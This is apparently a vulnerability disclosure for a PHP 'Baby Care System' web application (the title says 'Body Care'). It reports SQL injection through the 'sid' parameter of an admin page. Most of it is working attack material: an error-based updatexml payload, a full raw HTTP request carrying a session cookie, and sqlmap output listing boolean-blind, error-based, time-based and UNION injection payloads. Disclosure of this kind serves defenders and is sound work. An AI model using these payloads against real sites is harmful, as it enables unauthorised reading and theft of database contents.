## Body Care System has SQL injection vulnerability

vendor: https://www.sourcecodester.com/php/14622/baby-care-system-phpmysqli-full-source-code.html

Vulnerability file: /BabyCare/admin/siteoptions.php&social=edit&sid=2

![image](https://user-images.githubusercontent.com/54017627/161355814-8bce8909-9020-43dd-a492-361ab6e520e0.png)

Vulnerability location: /BabyCare/admin.php?id=siteoptions&social=edit&sid=2 //sid is Injection point

[+]Payload: /BabyCare/admin.php?id=siteoptions&social=edit&sid=2%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+  //sid is Injection point

```sql
GET /BabyCare/admin.php?id=siteoptions&social=edit&sid=2%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+ HTTP/1.1
Host: 192.168.1.19
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=h48mjnelp4g0935821l2k3g5ne
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/161355703-99684aa9-cc05-46f2-8a86-60f952aa132f.png)

```sql
---
Parameter: sid (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: id=siteoptions&social=edit&sid=2' RLIKE (SELECT (CASE WHEN (4429=4429) THEN 2 ELSE 0x28 END))-- iXwH

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=siteoptions&social=edit&sid=2' AND EXTRACTVALUE(1351,CONCAT(0x5c,0x7170787a71,(SELECT (ELT(1351=1351,1))),0x71766b6b71))-- HBrb

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=siteoptions&social=edit&sid=2' AND (SELECT 7457 FROM (SELECT(SLEEP(5)))rJyk)-- Jbjw

    Type: UNION query
    Title: MySQL UNION query (NULL) - 4 columns
    Payload: id=siteoptions&social=edit&sid=2' UNION ALL SELECT CONCAT(0x7170787a71,0x7a6553456a624b4879616d74567777764c616861466e43454a6b757171564a514c63547655456d48,0x71766b6b71),NULL,NULL,NULL#
---
```
![image](https://user-images.githubusercontent.com/54017627/161355757-1c7743cd-f5e4-428d-9bec-09389cf15188.png)
